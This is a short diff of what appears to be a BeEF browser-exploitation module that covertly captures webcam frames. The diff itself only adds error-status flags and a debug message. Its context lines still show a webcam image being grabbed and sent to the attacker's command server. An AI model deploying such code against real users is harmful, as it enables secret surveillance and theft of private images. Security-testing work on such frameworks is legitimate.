@@ -23,7 +23,7 @@ beef.execute(function() {
             ctx.drawImage(vid_el,0,0);
             beef.net.send("<%= @command_url %>",<%= @command_id %>, 'image='+can_el.toDataURL('image/png'));
         } else {
-            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=something went wrong');
+            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=something went wrong', beef.are.status_error());
         }
     }
 
@@ -36,15 +36,9 @@ beef.execute(function() {
         setTimeout(cap,2000);
 
     }, function(err) {
-        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=getUserMedia call failed');
+        beef.debug('[Webcam HTML5] Error: getUserMedia call failed');
+        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=getUserMedia call failed', beef.are.status_error());
     });
 
-
-
-
 });
-
-
-
-
 
